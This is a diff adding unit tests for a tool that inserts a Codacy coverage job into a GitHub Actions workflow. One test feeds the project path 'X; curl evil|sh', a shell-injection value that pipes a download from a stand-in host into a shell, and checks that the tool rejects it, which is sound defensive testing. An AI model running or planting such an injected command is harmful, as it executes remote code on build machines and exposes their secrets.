@@ -148,5 +148,76 @@ public class CodacyCoverageWorkflowEditorTests
 		CodacyCoverageWorkflowEditor.AddUpload(once, CoverageRunner.MicrosoftTestingPlatform).Should().BeNull();
 	}
 
+	private const string _noTests = """
+		name: CI
+
+		on:
+		  push:
+		    branches: [main]
+
+		jobs:
+		  build:
+		    runs-on: ubuntu-latest
+		    steps:
+		    - name: Checkout
+		      uses: actions/checkout@v6
+		      with:
+		        fetch-depth: 0
+
+		    - name: Setup .NET
+		      uses: actions/setup-dotnet@v5
+		      with:
+		        dotnet-version: 10.0.x
+
+		    - name: Build
+		      run: dotnet build
+		""";
+
+	[Theory]
+	[InlineData(CoverageRunner.MicrosoftTestingPlatform, "dotnet test --project X.Test/X.Test.csproj --coverage")]
+	[InlineData(CoverageRunner.VsTest, "dotnet test X.Test/X.Test.csproj --collect:\"XPlat Code Coverage\"")]
+	public void AddCoverageJob_ShouldAppendAParsableJobReusingThePinnedActions(CoverageRunner runner, string command)
+	{
+		var edited = CodacyCoverageWorkflowEditor.AddCoverageJob(_noTests, runner, "X.Test/X.Test.csproj")!;
+
+		edited.Should().Contain(command);
+		edited.Should().Contain("uses: actions/checkout@v6").And.Contain("uses: actions/setup-dotnet@v5");
+		edited.Should().Contain("dotnet-version: 10.0.x");
+		edited.Should().Contain("codacy/codacy-coverage-reporter-action@v1");
+		Lines(edited).Should().Contain("  coverage:").And.Contain("    continue-on-error: true");
+
+		var stream = new YamlStream();
+		var act = () => stream.Load(new StringReader(edited));
+		act.Should().NotThrow();
+		var jobs = (YamlMappingNode)((YamlMappingNode)stream.Documents[0].RootNode).Children[new YamlScalarNode("jobs")];
+		jobs.Children.Keys.Select(k => ((YamlScalarNode)k).Value).Should().Equal("build", "coverage");
+	}
+
+	[Fact]
+	public void AddCoverageJob_ShouldDeclineWhenAddedTwice()
+	{
+		var once = CodacyCoverageWorkflowEditor.AddCoverageJob(_noTests, CoverageRunner.VsTest, "X.Test/X.Test.csproj")!;
+
+		CodacyCoverageWorkflowEditor.AddCoverageJob(once, CoverageRunner.VsTest, "X.Test/X.Test.csproj").Should().BeNull();
+	}
+
+	[Fact]
+	public void AddCoverageJob_ShouldDeclineWhenJobsIsNotTheLastKey()
+		=> CodacyCoverageWorkflowEditor
+			.AddCoverageJob(_noTests + "\nenv:\n  A: b\n", CoverageRunner.VsTest, "X.Test/X.Test.csproj")
+			.Should().BeNull();
+
+	[Fact]
+	public void AddCoverageJob_ShouldDeclineWithoutThePinnedActionsToReuse()
+		=> CodacyCoverageWorkflowEditor
+			.AddCoverageJob("jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - run: dotnet build\n", CoverageRunner.VsTest, "X.Test/X.Test.csproj")
+			.Should().BeNull();
+
+	[Fact]
+	public void AddCoverageJob_ShouldDeclineAProjectPathThatCouldInjectShell()
+		=> CodacyCoverageWorkflowEditor
+			.AddCoverageJob(_noTests, CoverageRunner.VsTest, "X; curl evil|sh")
+			.Should().BeNull();
+
 	private static List<string> Lines(string text) => [.. text.Replace("\r\n", "\n").Split('\n')];
 }
